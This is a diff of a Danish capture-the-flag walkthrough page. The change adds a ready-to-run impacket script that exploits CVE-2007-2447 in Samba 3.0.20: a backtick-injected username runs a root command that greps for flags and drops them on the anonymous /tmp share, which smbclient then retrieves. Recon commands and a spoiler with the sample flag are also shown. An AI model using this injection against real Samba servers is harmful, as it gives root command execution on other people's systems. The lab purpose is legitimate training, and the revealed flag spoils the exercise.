@@ -25,10 +25,22 @@
 <h2>Trin for trin</h2>
 <pre><code>nmap -sV -p139,445 &lt;ip&gt;        # Samba 3.0.20 = CVE-2007-2447
 smbclient -L //&lt;ip&gt;/ -N --option='client min protocol=NT1'   # shares: tmp (skrivbar)</code></pre>
-             <p>Reverse/bind-shells er netværksblokeret. Kør kommandoen via injektionen (impacket, ondsindet brugernavn)
-             og exfiltrér via den anonyme <code>/tmp</code>-share:</p>
-             <pre><code>c.login("/=`nohup grep -rIoh -e 'HKN{[^}]*}' / 2>/dev/null|sort -u>/tmp/FLAGS;chmod 777 /tmp/FLAGS`","")
-# login kaster LOGON_FAILURE, men map-scriptet kører cmd som root FØR auth fejler</code></pre>
+             <p>Reverse/bind-shells er netværksblokeret (ingen rute tilbage til din VPN-IP, og kun 139/445 er
+             åbne indgående). <code>smbclient</code> og Metasploits shell-moduler kan ikke udnytte dette, så brug
+             <code>impacket</code>'s lav-niveau SMB1-kontrol til selv at styre brugernavnet der sendes under
+             login. CVE-2007-2447's sårbarhed er at <code>username map script</code> kører brugernavnet som en
+             shell-kommando, <em>før</em> login overhovedet fejler:</p>
+             <pre><code>pip install impacket   # hvis den ikke allerede er installeret
+cat > rce.py &lt;&lt;'PY'
+from impacket.smbconnection import SMBConnection, SMB_DIALECT
+c = SMBConnection('&lt;ip&gt;', '&lt;ip&gt;', sess_port=139, preferredDialect=SMB_DIALECT)
+cmd = "nohup grep -rIoh -e 'HKN{[^}]*}' / 2>/dev/null|sort -u>/tmp/FLAGS;chmod 777 /tmp/FLAGS"
+c.login(f"/=`{cmd}`", "")
+PY
+python3 rce.py
+# login kaster LOGON_FAILURE (forventet), men map-scriptet kører kommandoen som root FØR auth fejler
+smbclient '//&lt;ip&gt;/tmp' -N -c 'get FLAGS'
+cat FLAGS</code></pre>
 <details class="spoiler"><summary>🚩 Vis løsning &amp; eksempel-flag</summary>
 <p>Flag: <span class="flag">HKN{h13-EW-XICln}</span></p>
 </details>
